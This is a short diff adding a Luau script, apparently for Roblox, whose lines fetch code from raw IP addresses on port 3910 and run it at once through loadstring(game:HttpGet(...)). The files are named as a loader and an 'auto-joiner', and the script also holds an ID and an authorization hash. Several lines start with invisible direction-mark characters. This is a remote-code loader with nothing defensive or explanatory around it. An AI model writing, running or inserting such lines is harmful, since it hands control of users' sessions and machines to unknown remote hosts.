@@ -1,0 +1,7 @@
+ID="e81bdc8e-14ef-43b7-8b84-817b3b79e820";
+‎RUN_AFTER=loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+‎
+‎loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+‎AUTHORIZATION_KEY="$2b$10$3hz5SnvhKZE/dmMTYbWWXONsujL6BAp7kaOAOmgZUJBW8xW8JIUSW";
+‎loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/auto-joiner.luau"))()
+‎
